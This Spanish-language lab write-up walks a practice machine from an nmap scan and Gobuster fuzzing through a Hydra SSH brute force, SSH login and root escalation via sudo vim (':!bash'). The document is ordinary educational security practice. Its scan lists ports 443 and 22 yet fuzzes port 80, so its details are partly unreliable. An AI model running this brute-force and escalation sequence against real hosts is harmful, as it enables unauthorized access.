# Nmap & Fuzzing

## Reconocimiento con Nmap
Comenzamos con el escaneo con **Nmap** para identificar los puertos abiertos en la máquina objetivo.

```sh
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn <IP>
```

![Escaneo con Nmap](Pasted%20image%20250420150515.png)

Se identifican **2 puertos abiertos**:
- **HTTPS** (`443`)
- **SSH** (`22`)

## Fuzzing en el puerto 80
Utilizamos **Gobuster** para realizar un fuzzing en el puerto `80` y descubrir rutas ocultas.

```sh
gobuster dir -w /home/kali/WordLists/directory-medium -u http://<IP> -x txt,sql,py,js,php,html
```

![Resultado de Gobuster](Pasted%20image%20250420150909.png)

Entre los resultados, encontramos un mensaje dirigido a un usuario llamado **Mario**.

![Mensaje encontrado](Pasted%20image%20250420151003.png)

## Ataque de fuerza bruta por SSH
Probamos un ataque de **fuerza bruta con diccionario** contra el usuario descubierto.

```sh
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

![Ataque de fuerza bruta](Pasted%20image%20250420151934.png)

Ejecutando el ataque, encontramos que la contraseña es **chocolate**.

## Acceso por SSH y escalada de privilegios
Ingresamos vía **SSH** con las credenciales obtenidas.

```sh
ssh mario@<IP>
```

Una vez dentro, verificamos los permisos con:

```sh
sudo -l
```

Descubrimos que tenemos acceso a ejecutar **vim** con privilegios elevados.

![Permisos con Vim](Pasted%20image%20250420152338.png)

Aprovechamos **Vim** para abrir una terminal:

```sh
:!bash
```

Desde aquí solicitamos a **vim** que abra otra sesión con privilegios de **root**.

![Ejecutando Vim como root](Pasted%20image%20250420152811.png)

Y con esto, **ya somos root**.

![Acceso root obtenido](Pasted%20image%20250420152835.png)

